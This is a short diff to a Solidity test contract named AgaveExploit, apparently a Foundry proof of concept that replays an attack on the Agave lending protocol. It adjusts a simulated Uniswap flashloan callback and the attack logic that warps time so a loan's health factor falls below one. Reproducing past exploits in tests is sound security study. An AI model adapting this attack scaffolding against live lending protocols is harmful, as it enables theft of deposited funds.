@@ -153,15 +153,15 @@ contract AgaveExploit is Test {
     }
 
     function _flashWETH() internal {
-        uniswapV2Call(address(this), ethFlashloanAmt, 0, new bytes(0));
+        uniswapV2Call(address(this), ethFlashloanAmt, 0, abi.encode(msg.sender));
     }
 
-    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) public {
+    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes memory _data) public {
         //We simulate a flashloan from uniswap for initial eth funding
         _attackLogic(_amount0, _amount1, _data);
     }
 
-    function _attackLogic(uint256 _amount0, uint256 _amount1, bytes calldata _data) internal {
+    function _attackLogic(uint256 _amount0, uint256 _amount1, bytes memory _data) internal {
         //This will fast forward block number and timestamp to cause hf to be lower due to interest on loan pushing hf below one
         vm.warp(block.timestamp + 1 hours);
         vm.roll(block.number + 1);
